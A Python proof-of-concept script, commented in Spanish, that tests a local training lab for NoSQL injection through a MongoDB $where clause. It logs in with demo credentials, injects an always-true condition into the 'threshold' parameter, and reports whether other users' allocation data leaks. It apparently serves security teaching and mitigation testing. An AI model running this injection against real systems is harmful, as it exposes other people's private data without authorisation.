#!/usr/bin/env python3
"""V2 - NoSQL Injection (Server-Side JS via $where). Dueno: Bryan. OWASP A05:2025.

Uso: SOLO contra la instancia LOCAL del laboratorio.
  python3 poc-scripts/v2_nosqli.py            # http://localhost:4000 (vulnerable)
  BASE=http://localhost:4001 python3 poc-scripts/v2_nosqli.py   # mitigada

Que demuestra
-------------
El endpoint GET /allocations/<userId>?threshold=<...> concatena 'threshold'
sin sanitizar dentro de una clausula $where de MongoDB (allocations-dao.js).
$where ejecuta JavaScript en el servidor de la BD, asi que una entrada como
  0' || '1'=='1
convierte el filtro en una condicion siempre verdadera y devuelve las
asignaciones de TODOS los usuarios, no solo las del userId pedido.

Metodo (solo lectura, sin payloads destructivos)
------------------------------------------------
1. Login con una cuenta demo del laboratorio.
2. Linea base: threshold=-1 -> devuelve solo las filas del propio userId.
3. Inyeccion: threshold con una condicion booleana verdadera -> si devuelve
   MAS filas (datos de otros usuarios), el $where ejecuto la entrada = VULNERABLE.

Codigo de salida: 1 = vulnerable (inyeccion funciona), 0 = mitigado, 2 = error.
"""
import os
import re
import sys
import urllib.parse
import urllib.request
import http.cookiejar

BASE = os.environ.get("BASE", "http://localhost:4000").rstrip("/")
USER = os.environ.get("POC_USER", "admin")
PASSWORD = os.environ.get("POC_PASS", "Admin_123")
USER_ID = os.environ.get("POC_UID", "1")           # userId en la URL
INJECTION = "0' || '1'=='1"                          # condicion siempre verdadera

ROW_RE = re.compile(r"Asset Allocations for ([^<]+)")


def build_opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def login(opener):
    data = urllib.parse.urlencode({"userName": USER, "password": PASSWORD}).encode()
    req = urllib.request.Request(f"{BASE}/login", data=data,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    with opener.open(req, timeout=15) as r:
        r.read()


def allocations(opener, threshold):
    qs = urllib.parse.urlencode({"threshold": threshold})
    url = f"{BASE}/allocations/{USER_ID}?{qs}"
    try:
        with opener.open(url, timeout=15) as r:
            return r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:            # p.ej. 500 cuando no hay filas
        return e.read().decode("utf-8", "replace")


def rows(html):
    return [n.strip() for n in ROW_RE.findall(html)]


def main():
    opener = build_opener()
    try:
        login(opener)
    except Exception as e:
        print(f"[V2] ERROR de login contra {BASE}: {e}")
        return 2

    base_rows = rows(allocations(opener, "-1"))      # solo propias
    inj_rows = rows(allocations(opener, INJECTION))  # intento de inyeccion

    print(f"[V2] Destino: {BASE}  userId={USER_ID}")
    print(f"[V2] Payload threshold: {INJECTION!r}")
    print(f"[V2] Linea base (threshold=-1): {len(base_rows)} fila(s) -> {sorted(set(base_rows))}")
    print(f"[V2] Con inyeccion:             {len(inj_rows)} fila(s) -> {sorted(set(inj_rows))}")

    leaked = sorted(set(inj_rows) - set(base_rows))
    if len(inj_rows) > len(base_rows) and leaked:
        print(f"[V2] Datos expuestos de otros usuarios: {leaked}")
        print("[V2] RESULTADO: VULNERABLE - el $where ejecuto la entrada (A05:2025)")
        return 1
    print("[V2] RESULTADO: MITIGADO - la inyeccion no altero el resultado")
    return 0


if __name__ == "__main__":
    sys.exit(main())
